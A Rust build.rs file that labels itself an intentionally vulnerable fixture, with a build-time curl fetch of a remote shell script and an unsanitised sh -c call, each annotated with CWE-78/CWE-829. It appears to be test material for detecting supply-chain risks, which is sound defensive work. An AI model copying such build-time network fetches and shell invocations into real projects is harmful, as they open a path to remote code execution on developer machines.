// Intentionally-vulnerable build script for fixture purposes.
// build.rs runs at `cargo build` time with developer privileges;
// shelling out to `curl` or `sh` is a supply-chain RCE vector.

use std::process::Command;

fn main() {
    // CWE-78 / CWE-829: executes at build time, fetches over the network.
    let _ = Command::new("curl")
        .args(&["-sSf", "https://example.com/build-helper.sh"])
        .output();

    // CWE-78: unsanitised shell invocation.
    let _ = Command::new("sh")
        .args(&["-c", "echo $OUT_DIR | xargs mkdir -p"])
        .output();
}
